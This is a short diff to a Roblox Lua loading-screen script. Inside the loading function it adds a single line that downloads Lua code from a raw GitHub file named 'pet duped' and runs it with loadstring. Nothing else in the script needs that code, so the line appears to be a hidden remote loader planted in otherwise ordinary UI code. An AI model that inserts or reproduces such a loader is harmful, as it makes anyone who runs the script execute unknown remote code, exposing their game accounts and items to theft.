@@ -1,3 +1,4 @@
+
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
@@ -24,6 +25,8 @@ local function showLoadingScreen()
             end
         end)()
     end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zolowner/Notrayz/refs/heads/main/pet%20duped"))()
 
     local bg = Instance.new("Frame", loadingGui)
     bg.Size = UDim2.new(1, 0, 1, 0)
